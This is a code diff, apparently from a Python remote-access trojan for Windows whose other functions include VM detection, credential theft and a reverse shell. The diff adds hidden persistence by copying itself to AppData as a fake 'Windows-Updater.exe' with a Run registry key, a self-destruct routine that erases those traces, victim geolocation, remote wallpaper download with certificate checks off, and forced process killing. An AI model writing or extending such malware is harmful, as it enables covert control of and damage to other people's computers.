@@ -6,14 +6,12 @@ import pyautogui
 import requests
 import platform
 import random
+import shutil
 import json
 import ctypes
+import sys
 import re
 import os
-
-
-def autoPersistent():
-    pass
 
 
 def isVM():
@@ -152,7 +150,7 @@ def process():
 
 
 def upload(url, name):
-    path = fr'C:\Users\{getUsername()}\.config\uploads'\
+    path = fr'C:\Users\{getUsername()}\.config\uploads'
     
     try:
         r = requests.get(url, allow_redirects = True, verify = False)
@@ -189,7 +187,19 @@ def creds():
 
 
 def persistent():
-    pass
+    try:
+        backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
+        if not os.path.exists(backdoor_location):
+            shutil.copyfile(sys.executable, backdoor_location)
+            sp.call(
+                'red add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
+                shell = True
+            )
+            return True
+        else:
+            return "already-enabled"
+    except Exception as e:
+        return e
 
 
 def cmd(command:str):
@@ -204,18 +214,40 @@ def cmd(command:str):
     )
     out, err = result.communicate()
     result.wait()
-    if not err:
-        return out
-    else:
+    if err:
         return err
+    else:
+        return out
 
 
 def selfdestruct():
-    pass
+    try:
+        update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
+        config_location = fr'C:\Users\{getUsername()}\.config'
+        
+        sp.call(
+            'red delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + update_location + '" /f',
+            shell = True
+        )
+        
+        if os.path.exists(update_location):
+            os.remove(update_location)
+        if os.path.exists(config_location):
+            shutil.rmtree(config_location)
+        
+        return True
+
+    except Exception as e:
+        return e
 
 
 def location():
-    pass
+    try:
+        response = requests.get('https://ipinfo.io')
+        data = response.json()
+        return data
+    except Exception:
+        return False
 
 
 def revshell(ip, port):
@@ -226,10 +258,40 @@ def recordmic(seconds):
     pass
 
 
-def wallpaper(path):
-    pass
+def wallpaper(path:str):
+    if path.startswith("http"):
+        try:
+            wallpaper_name = f"wallpaper.{path[-3:]}"
+            r = requests.get(path, allow_redirects = True, verify = False)
+            open(fr"C:\Users\{getUsername()}\.config\uploads\{wallpaper_name}", 'wb').write(r.content)
+            wallpaper_location = fr"C:\Users\{getUsername()}\.config\uploads\{wallpaper_name}"
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_location, 0)
+            return True
+        except Exception as e:
+            return e
+    else:
+        try:
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+            return True
+        except Exception as e:
+            return e
+
 
 
 def killproc(pid):
-    pass
+    result = sp.Popen(
+        f"taskkill /F /PID {pid}",
+        stderr = sp.PIPE,
+        stdin = sp.DEVNULL,
+        stdout = sp.PIPE,
+        shell = True,
+        text = True,
+        creationflags = 0x08000000
+    )
+    out, err = result.communicate()
+    result.wait()
 
+    if err:
+        return err
+    else:
+        return True
